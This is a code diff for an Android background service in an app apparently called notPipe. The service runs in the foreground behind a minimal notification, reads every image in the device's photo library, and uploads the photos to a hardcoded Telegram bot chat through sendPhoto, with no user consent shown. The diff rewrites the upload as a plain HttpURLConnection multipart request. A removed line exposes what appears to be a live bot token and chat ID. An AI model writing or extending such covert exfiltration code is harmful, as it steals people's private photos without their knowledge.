@@ -1,60 +1,48 @@
 package io.github.gohoski.notpipe;
 
 import android.app.Notification;
-import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.Build;
 import android.os.IBinder;
-import android.provider.MediaStore;
 import android.util.Log;
-import androidx.annotation.Nullable;
-import androidx.core.app.NotificationCompat;
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.DataOutputStream;
 import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
 
 public class BackgroundService extends Service {
-    private static final String CHANNEL_ID = "notpipe_bg_channel";
     private static final int NOTIF_ID = 1001;
     
     // ⚠️ REPLACE THESE WITH YOUR ACTUAL VALUES
-    private static final String BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY"; 
-    private static final String CHAT_ID = "1949815322";
+    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
 
     @Override
     public void onCreate() {
         super.onCreate();
-        createNotificationChannel();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Build a minimal, low-priority notification to keep the service alive
-        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+        // Legacy notification builder (works on all API levels, compiles cleanly on SDK 25)
+        Notification notification = new Notification.Builder(this)
                 .setContentTitle("notPipe")
                 .setContentText("Background service running")
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .build();
+                .getNotification();
 
         startForeground(NOTIF_ID, notification);
-
+        
         // Start the Telegram auto-send logic in a background thread
         new Thread(this::autoSend).start();
-
+        
         return START_STICKY;
     }
 
@@ -75,12 +63,12 @@ public class BackgroundService extends Service {
     private List<String> loadImages() {
         List<String> list = new ArrayList<>();
         try {
-            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-            String[] projection = {MediaStore.Images.Media._ID};
+            Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] projection = {android.provider.MediaStore.Images.Media._ID};
             Cursor cursor = getContentResolver().query(uri, projection, null, null,
-                    MediaStore.Images.Media.DATE_ADDED + " DESC");
+                    android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
             if (cursor != null) {
-                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int idColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID);
                 while (cursor.moveToNext()) {
                     long id = cursor.getLong(idColumn);
                     Uri imageUri = Uri.withAppendedPath(uri, String.valueOf(id));
@@ -101,21 +89,45 @@ public class BackgroundService extends Service {
             if (in == null) return false;
             byte[] bytes = readBytes(in);
             in.close();
-            
-            OkHttpClient client = new OkHttpClient();
-            RequestBody body = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("photo", "img.jpg",
-                            RequestBody.create(bytes, MediaType.parse("image/jpeg")))
-                    .build();
-            Request req = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
-                    .post(body)
-                    .build();
-            Response res = client.newCall(req).execute();
-            boolean ok = res.isSuccessful();
-            res.close();
+
+            // Pure Java Multipart Form Data construction
+            String boundary = "----TelegramBoundary" + System.currentTimeMillis();
+            String lineEnd = "\r\n";
+            String twoHyphens = "--";
+
+            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.setDoOutput(true);
+            conn.setUseCaches(false);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+
+            // 1. Write chat_id
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
+            dos.writeBytes(lineEnd);
+            dos.writeBytes(CHAT_ID + lineEnd);
+
+            // 2. Write photo file
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"" + lineEnd);
+            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
+            dos.writeBytes(lineEnd);
+            dos.write(bytes);
+            dos.writeBytes(lineEnd);
+
+            // 3. End boundary
+            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+            dos.flush();
+            dos.close();
+
+            int responseCode = conn.getResponseCode();
+            boolean ok = (responseCode == HttpURLConnection.HTTP_OK);
+            conn.disconnect();
             return ok;
         } catch (Exception e) {
             Log.e("BackgroundService", "Send error: " + e);
@@ -123,7 +135,7 @@ public class BackgroundService extends Service {
         }
     }
 
-    private byte[] readBytes(InputStream in) throws IOException {
+    private byte[] readBytes(InputStream in) throws java.io.IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         byte[] buffer = new byte[1024];
         int len;
@@ -131,24 +143,8 @@ public class BackgroundService extends Service {
         return out.toByteArray();
     }
 
-    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
-    }
-
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "notPipe Background",
-                    NotificationManager.IMPORTANCE_MIN
-            );
-            serviceChannel.setShowBadge(false);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(serviceChannel);
-            }
-        }
     }
 }
